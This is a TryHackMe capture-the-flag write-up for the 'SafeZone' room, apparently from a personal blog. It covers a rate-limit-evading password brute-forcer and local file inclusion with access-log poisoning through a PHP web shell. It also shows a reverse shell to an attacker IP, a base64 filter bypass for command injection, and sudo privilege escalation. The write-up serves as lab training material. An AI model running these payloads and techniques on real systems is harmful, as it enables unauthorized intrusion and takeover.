# SafeZone

SafeZone was an amazing room I got a chance to do at [TryHackMe](https://tryhackme.com/). If you're reading this writeup I vividly recommend giving it an honest try first and coming here only when you're stuck.

Let's begin! 

We first place safezone.thm in the /etc/hosts file. Its standard practice on TryHackMe to do this, though not always necessary.

From here we start start our standard enumeration beginning with nmap.

```
root@ip-10-10-213-155:~# nmap -sC -sT -O -vv safezone.thm

Starting Nmap 7.60 ( https://nmap.org ) at 2021-03-29 16:02 BST
[SNIP]
Scanning safezone.thm (10.10.26.113) [1000 ports]
Discovered open port 80/tcp on 10.10.26.113
Discovered open port 22/tcp on 10.10.26.113
[SNIP]
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
| ssh-hostkey: 
|   2048 30:6a:cd:1b:0c:69:a1:3b:6c:52:f1:22:93:e0:ad:16 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIZwg1Xg+/teSBsAyVem1Ovp/oFv0mR+IX+4/qdmqRNPhah+L7o7OJvxd9wKXci4wKKybo403rgpj9hTpAKC3JkYM9q/7p0fMcmf/gHTZIkPV/kC2Lk9RRNyYKPBTGgkyHQI5fBbbxLAIqLfScgIU3O+4EAi2DIVohjToPrrSlRF5BYgb/SGeQ0PF7xlkHLKQJb7jMAWztiCsemGP+6FSCJlw0DHHry8L41pxAaDOSGHkbIGQBZtumflUEBuyDE86aWEKJmTuMHrUAbxdwq4NEisQeGuy2Dp56U0dHk1r3gT600LDeJbgfwPX9QJjvR69+/wnFXPrscHxw1avI3tS3
|   256 84:f4:df:87:3a:ed:f2:d6:3f:50:39:60:13:40:1f:4c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDd+Ow7P3VaJCNTcFZ8VJrva7Qb5nXQwjfA4E1dZ5z2bB0nvMYS8q7stBc6G/hbIRBhtCDHO/VoF+J3Mgv+n7xQ=
|   256 9c:1e:af:c8:8f:03:4f:8f:40:d5:48:04:6b:43:f5:c4 (EdDSA)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMWsHWoXXYB4phx5IY+yiW0K8aNHbCOzAPWtMB9K4KKJ
80/tcp open  http    syn-ack
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-title: Whoami?
[SNIP]
Nmap done: 1 IP address (1 host up) scanned in 16.04 seconds
           Raw packets sent: 188 (19.614KB) | Rcvd: 144 (16.242KB)
```

Looks like we've got a webserver running on port 80, the default http port. Let's start gobuster then and enumerate it.

You don't have to use gobuster. Wfuzz and Fuff are popular alternatives. I quite like gobuster though.

```
root@ip-10-10-213-155:~# gobuster dir -u http://safezone.thm/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://safezone.thm/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt,html
[+] Timeout:        10s
===============================================================
2021/03/29 16:06:57 Starting gobuster
===============================================================
/.hta (Status: 403)
/.hta.html (Status: 403)
/.hta.php (Status: 403)
/.hta.txt (Status: 403)
/.htaccess (Status: 403)
/.htaccess.php (Status: 403)
/.htaccess.txt (Status: 403)
/.htaccess.html (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.txt (Status: 403)
/.htpasswd.html (Status: 403)
/dashboard.php (Status: 302)
/detail.php (Status: 302)
/index.php (Status: 200)
/index.html (Status: 200)
/index.html (Status: 200)
/index.php (Status: 200)
/logout.php (Status: 200)
/news.php (Status: 302)
/note.txt (Status: 200)
/register.php (Status: 200)
/server-status (Status: 403)
===============================================================
2021/03/29 16:06:58 Finished
===============================================================
```

That's quite a lot of directories, and /.htpasswd is very interesting, but sadly it returns the 403 (Forbidden) status code. Still, plenty to look around and investigate. 

Let's start with checking out note.txt first. Going over to the page we see printed out the following message over a white background:

"Message from admin: I can't remember my password always , that's why I have saved it in /home/files/pass.txt file ."

That's quite interesting, let's keep that in mind.

Detail, news, index and dashboard all leads us to a login form, but register leads us to a register form instead.

I tried default credentials on the login form such as admin:admin and admin:password, these are pretty common and if you look online for default passwords of many services you're bound to find them. Unfortunately for us that doesn't seem to be the case here. Still, we can register an account so let's do that!

![image](https://user-images.githubusercontent.com/73745039/113361313-a4afab00-9343-11eb-9ffd-81250bd4ed1e.png)

As we can see we have a few tabs. Contact outright doesn't lead anywhere, but News and Details do. The former says: 

"I have something to tell you , it's about LFI or is it RCE or something else?"

And the latter says:

![image](https://user-images.githubusercontent.com/73745039/113361305-9c577000-9343-11eb-9e83-3d8764248703.png)

This is all very interesting. 

Immediately I checked my cookie though it wasn't anything I could immediately manipulate. The wording on the News page makes me think we have to find LFI somewhere...


I open the source code on the detail page and well well well:
![image](https://user-images.githubusercontent.com/73745039/113361552-31f2ff80-9344-11eb-9163-354f5c5e6219.png)

We have a GET parameter, and a LFI one no less!

For those who do not know, LFI stands for Local File Inclusion, and it's when you use a server's own resources to access files you shouldn't have access to. For example, if a page displays an image through a parameter like page=/files/images/dog.png, you could experiment with changing it to something like page=/files/secret_file.txt and it would display it to you, even if it is something you shouldn't have access to, because it is tecnically the server itself having access to it and displaying it to you.

Now, I got stuck here for a long while trying to use the parameter "page" to get access to /home/files/pass.txt to no avail. I doubled up on enumeration and after a long while I eventually found that Apache has a setting where it includes home directories in it's file system, accessible through ~/[Name of User]. Trying http://safezone.thm/~files/pass.txt got us exactly what we wanted!

```
Admin password hint :-
admin__admin
" __ means two numbers are there , this hint is enough I think :) "
```

So now we know we have a username for sure named "Admin" and a password admin__admin with two numbers between them.

You can try to enumerate them by hand but dear lord that'd be tedious. I opted to do a python script instead.

But wait! After 3 attempts, the server tosses out this damn line!
"To many failed login attempts. Please login after 60 sec"
So I present to you, ladies and gentlemen: the world's slowest fuzzer!

```
#!/usr/bin/python3

import requests
import time
import re

teststop = 0

for x in range(10):
	for y in range(10):
		trypass = "admin"+str(x)+str(y)+"admin"
		
		datafuzz = {"username":'Admin',"password":trypass,"submit":'Submit'}
		response = requests.post('http://safezone.thm/index.php', data=datafuzz)
		found = re.findall('Please enter valid login details', response.text)
		found2 = re.findall('To many failed', response.text)
		print(trypass + ":", end="" )
		if found != [] or found2 != []:
			print("Not found")
		else:
			print("found!")
			print("Finishing.")
			quit();
		teststop = teststop+1
		if teststop > 2:
			print()
			print("sleeping...")
			print()
			time.sleep(57)
			print("resuming...")
			teststop = 0
			time.sleep(3)
```

And while we wait for the fuzzer to finish, it is an excellent time to talk about our sponsor for this writeup, raid- I'm kidding. I wish I was sponsored by anyone! By no, while you wait there is actually a way to make the script run faster. If you create an account and make the script log onto that account you created on every 3rd attempt then the error never occurs and you can fuzz without any restrictions. 

I'll leave that for you to implement if you chose to use the script above. :P

![image](https://user-images.githubusercontent.com/73745039/113362086-7501a280-9345-11eb-8478-60bf2640dffa.png)

There we go! After waiting a little bit we've got our password!

With the credentials we can log in as the Admin and head on over to the details page under their account. Not only do we now have access to seeing user passwords, but we now also have access to the LFI itself.

![image](https://user-images.githubusercontent.com/73745039/113362150-9bbfd900-9345-11eb-9988-ee970cd9d899.png)

Okay so, now that we can access other files in the system what are we looking for? Well. First we should check our own file to see how the LFI is being implemented. We can do this by using a php filter abd base64 encoding our own page. This can be done by typing this in the url:

http://safezone.thm/detail.php?page=php://filter/convert.base64-encode/resource=detail.php

Okay but rondons, what is that doing? Well, since the php filter is base64 encoding our php code, the php isn't being run, which allows us to read the server-side php of the detail page.

Knowing that there are no filters in our case we can then search for our main targets. We're looking for the access.log of the apache server. This is so we can do cache poisoning. 

http://safezone.thm/detail.php?page=/var/log/apache2/access.log

![image](https://user-images.githubusercontent.com/73745039/113362385-2e607800-9346-11eb-9bc9-b71f302f0b89.png)

Bingo! So now to poison the cache we start up burpsuit, reload the page and catch it in BURP. We replace our user-agent to:
	<?php passthru($_REQUEST['cmd']); ?>
And when we send our next request we've just injected PHP code into the cache, which will be ran when we next reload the page with any command in the new cmd parameter.

We start up our own terminal and listen for pings with:

tcpdump -i eth0 icmp

And then send out a ping to our own IP address!

http://safezone.thm/detail.php?page=/var/log/apache2/access.log&cmd=ping -c 5 [ATTACKER IP]

We get confirmation we've got code execution by being pinged. We then just run a reverse shell annnnd:

```
root@ip-10-10-213-155:~/lfi-fuzz# nc -nvlp 4242
Listening on [0.0.0.0] (family 0, port 4242)
Connection from 10.10.160.123 37880 received!
/bin/sh: 0: can't access tty; job control turned off
$ which python
$ which python3
/usr/bin/python3
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@safezone:/var/www/html$ ls
ls
dashboard.php  index.html		index.php   news.php  register.php
detail.php     index.nginx-debian.html	logout.php  note.txt
www-data@safezone:/var/www/html$ ^Z
[1]+  Stopped                 nc -nvlp 4242
root@ip-10-10-213-155:~/lfi-fuzz# stty raw -echo; fg
nc -nvlp 4242
             ls
dashboard.php  index.html		index.php   news.php  register.php
detail.php     index.nginx-debian.html	logout.php  note.txt
www-data@safezone:/var/www/html$ export TERM=xterm
www-data@safezone:/var/www/html$ 
```

We got ourselves a reverse shell from the server! Let's start our enumeration inside it then! And honestly, we don't really have to go that far.

Doing sudo -l we find we can run the command "find" as the user "files". That's in [GTFObins](https://gtfobins.github.io/) so it is an easy privesc.

```
www-data@safezone:/var$ sudo -l
Matching Defaults entries for www-data on safezone:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User www-data may run the following commands on safezone:
    (files) NOPASSWD: /usr/bin/find
www-data@safezone:/var$ ./find . -exec /bin/sh -p \; -quit
bash: ./find: No such file or directory
www-data@safezone:/var$ sudo -u files find . -exec /bin/sh -p \; -quit
$ whoami
files
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
files@safezone:/var$ 
```

As the user "files" we can find a suspicious file in their home directory. It looks like a hash of their password.

```
files@safezone:~$ ls -al
total 44
drwxrwxrwx 5 files files 4096 Mar 30 00:25  .
drwxr-xr-x 4 root  root  4096 Jan 29 12:30  ..
-rw------- 1 files files    0 Mar 29 04:10  .bash_history
-rw-r--r-- 1 files files  220 Jan 29 12:30  .bash_logout
-rw-r--r-- 1 files files 3771 Jan 29 12:30  .bashrc
drwx------ 2 files files 4096 Jan 29 20:44  .cache
drwx------ 3 files files 4096 Jan 29 20:44  .gnupg
drwxrwxr-x 3 files files 4096 Jan 30 09:30  .local
-rw-r--r-- 1 files files  807 Jan 29 12:30  .profile
-rw-r--r-- 1 root  root   105 Jan 29 20:38 '.something#fake_can@be^here'
-rwxrwxrwx 1 root  root   112 Jan 29 10:24  pass.txt
-rw-r--r-- 1 files files   37 Mar 30 00:25  test.php
files@safezone:~$ cat '.something#fake_can@be^here' 
files:$6$BUr7qnR3$v63gy9xL[REDACTED]VqOcawG/eTxOQ.UralcDBS0imrvVbc.
files@safezone:~$ 
```

Cracking the hash we can find "files" 's password. This works for their ssh.

```
root@ip-10-10-213-155:~# john hash.txt 
Warning: detected hash type "sha512crypt", but the string is also recognized as "sha512crypt-opencl"
Use the "--format=sha512crypt-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/opt/john/password.lst
[REDACTED]            (?)
1g 0:00:00:00 DONE 2/3 (2021-03-29 20:07) 5.555g/s 1422p/s 1422c/s 1422C/s 123456..franklin
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
root@ip-10-10-213-155:~# 
```

Typing sudo -l as "files" we can see we can run the command "id" as a user named yash, but that doesn't really help us much.

Eventually, after doing some more enumeration and finding little else I decided to run [linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), which helped me notice there was something running internally on 127.0.0.1:8000.

Lets do a bit of port forwarding! We have an ssh password so it'll be doubly easy!

First edit /etc/proxychains.conf to include socks5 127.0.0.1 2222 right at the bottom.

then ssh into the machine using files' password like so:

ssh -L 2222:127.0.0.1:8000 files@safezone.thm

And well, here we go again!

```
root@ip-10-10-213-155:~# gobuster dir -u http://127.0.0.1:2222 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,html,php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://127.0.0.1:2222
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt,html,php
[+] Timeout:        10s
===============================================================
2021/03/29 20:25:24 Starting gobuster
===============================================================
/login.html (Status: 200)
/pentest.php (Status: 200)
===============================================================
2021/03/29 20:26:04 Finished
===============================================================
```

We find a login page. Admin's credentials do not work. 

Pentest is interesting, it allows us to send a message to another user, yash, which we saw existed on the system. 

I wanted to see if it had command injection here. Surprisingly it does have blind command injection!!

I tried to send a reverse shell but there is some filtering going on. The word "bin" for example is being filtered. I thought on how to bypass this, including curling a payload of my design and executing it on the machine, but then I thought about just base64 encoding it.

And would you look at that, passing it with echo "[Payload]" | base64 -d | sh will actually run our payload and give us the reverse shell!

And after much sweat and work we have our first flag!
```
yash@safezone:/opt$ cd ..
cd ..
yash@safezone:/$ ls
ls
bin   home            lib64       opt   sbin      sys  vmlinuz
boot  initrd.img      lost+found  proc  snap      tmp  vmlinuz.old
dev   initrd.img.old  media       root  srv       usr
etc   lib             mnt         run   swapfile  var
yash@safezone:/$ cd home
cd home
yash@safezone:/home$ ls
ls
files  yash
yash@safezone:/home$ cd yash
cd yash
yash@safezone:~$ ls
ls
flag.txt
yash@safezone:~$ cat flag.txt
cat flag.txt
THM{[REDACTED]}
yash@safezone:~$ 
```

Running sudo -l immediately revealed the path forward!

```
yash@safezone:~$ sudo -l
sudo -l
Matching Defaults entries for yash on safezone:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User yash may run the following commands on safezone:
    (root) NOPASSWD: /usr/bin/python3 /root/bk.py
yash@safezone:~$ ls -al /root/bk.py
ls -al /root/bk.py
ls: cannot access '/root/bk.py': Permission denied
yash@safezone:~$ 
```

After trying a few things with this bk.py I discovered it can just copy files to other locations, though it keeps their permissions. 
This being the case, all I had to do was to copy our root flag to yash's home directory and! Done! Root flag is ours!

```
yash@safezone:/home$ cd yash
yash@safezone:~$ sudo /usr/bin/python3 /root/bk.py
Enter filename: /root/flag.txt
Enter destination: /home/yash
Enter Password: root
yash@safezone:~$ ls
test.txt
yash@safezone:~$ sudo /usr/bin/python3 /root/bk.py
Enter filename: /root/root.txt
Enter destination: /home/yash
Enter Password: 123
yash@safezone:~$ ls
root.txt  test.txt
yash@safezone:~$ cat root.txt 
THM{[REDACTED]}
```

We could root the machine by replacing bk.py itself with a bk.py of our own design that'd give us root permissions (since we can run it as root) or replace the /eetc/passwd file with one that contains another user with root permissions if we really wanted, but there is nothing else we need from this machine.

All in all I can say it was one of the best machines I've done on TryHackMe. I hope you've learnt something with this writeup!

Have a good one, and happy hacking!

< [Go Back](https://rondons.github.io/Journey-Into-Cyber/THMWriteups)

